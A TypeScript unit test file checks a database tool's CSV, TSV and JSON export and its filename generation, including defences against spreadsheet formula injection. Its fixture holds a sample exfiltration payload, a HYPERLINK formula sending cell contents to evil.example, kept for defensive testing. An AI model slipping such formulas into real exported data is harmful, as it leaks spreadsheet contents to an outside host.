/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvLine, toCsv, toJson, toTsv, exportFileName } from './exportData';
import type { QueryResult } from '../../shared/query';

const result: QueryResult = {
	fields: [{ name: 'id' }, { name: 'name' }, { name: 'note' }],
	rows: [
		[1, 'Alice', 'hi, there'],
		[2, 'Bob "the builder"', null],
		[3, 'line\nbreak', ''],
	],
	rowCount: 3,
	durationMs: 5,
};

test('CSV has a header and CRLF-joined rows', () => {
	const csv = toCsv(result);
	const lines = csv.split('\r\n');
	assert.equal(lines[0], 'id,name,note');
	assert.equal(lines.length, 4);
});

test('CSV quotes fields containing comma, quote, or newline', () => {
	const csv = toCsv(result);
	assert.match(csv, /"hi, there"/);
	assert.match(csv, /"Bob ""the builder"""/);
	assert.match(csv, /"line\nbreak"/);
});

test('CSV renders null as an empty field', () => {
	const csv = toCsv(result);
	const row2 = csv.split('\r\n')[2];
	assert.equal(row2, '2,"Bob ""the builder""",');
});

test('TSV has a header and tab-joined rows; null is empty; embedded newlines flatten', () => {
	const tsv = toTsv(result);
	const lines = tsv.split('\n');
	assert.equal(lines[0], 'id\tname\tnote');
	// One row per record despite the embedded newline in row 3.
	assert.equal(lines.length, 4);
	assert.equal(lines[2], '2\tBob "the builder"\t');
	assert.equal(lines[3], '3\tline break\t');
});

/** Cells a spreadsheet would run as a formula, and plain numbers it must not touch. */
const formulas: QueryResult = {
	fields: [{ name: '=cmd' }, { name: 'v' }],
	rows: [
		['=HYPERLINK("http://evil.example/?"&A1)', -5],
		['+1+1', '-12.5e3'],
		['-2+3', '@SUM(A1:A2)'],
		['\tleading tab', '\rcarriage'],
		['plain', 3],
	],
	rowCount: 5,
	durationMs: 1,
};

test('CSV neutralises a cell a spreadsheet would read as a formula, and leaves numbers alone', () => {
	const lines = toCsv(formulas).split('\r\n');
	assert.equal(lines[0], "'=cmd,v");
	assert.equal(lines[1], '"\'=HYPERLINK(""http://evil.example/?""&A1)",-5');
	assert.equal(lines[2], "'+1+1,-12.5e3");
	assert.equal(lines[3], "'-2+3,'@SUM(A1:A2)");
	assert.equal(lines[4], "'\tleading tab,\"'\rcarriage\"");
	assert.equal(lines[5], 'plain,3');
});

test('TSV (the clipboard) neutralises formulas the same way', () => {
	const lines = toTsv(formulas).split('\n');
	assert.equal(lines[0], "'=cmd\tv");
	assert.equal(lines[1], '\'=HYPERLINK("http://evil.example/?"&A1)\t-5');
	assert.equal(lines[3], "'-2+3\t'@SUM(A1:A2)");
	assert.equal(lines[5], 'plain\t3');
});

test('a flow\'s CSV line keeps the value as it is, and JSON is never touched', () => {
	assert.equal(csvLine(['=1+1', '@x', 'a']), '=1+1,@x,a');
	assert.equal(JSON.parse(toJson(formulas))[0]['=cmd'], '=HYPERLINK("http://evil.example/?"&A1)');
});

test('JSON is an array of objects keyed by field name with nulls preserved', () => {
	const parsed = JSON.parse(toJson(result));
	assert.equal(parsed.length, 3);
	assert.deepEqual(parsed[0], { id: 1, name: 'Alice', note: 'hi, there' });
	assert.equal(parsed[1].note, null);
});

const jan1 = new Date(2026, 0, 1);

test('export filename uses the FROM table and the date', () => {
	assert.equal(exportFileName('SELECT * FROM users WHERE id = 1', 'csv', jan1), 'users-2026-01-01.csv');
});

test('export filename strips quoting, schema prefix, and alias', () => {
	assert.equal(exportFileName('select * from `app`.`user_type` ut', 'json', jan1), 'user_type-2026-01-01.json');
});

test('export filename falls back to "query" when no table is found', () => {
	assert.equal(exportFileName('SELECT 1 + 1', 'csv', jan1), 'query-2026-01-01.csv');
	assert.equal(exportFileName('SELECT * FROM (SELECT 1) x', 'csv', jan1), 'query-2026-01-01.csv');
});
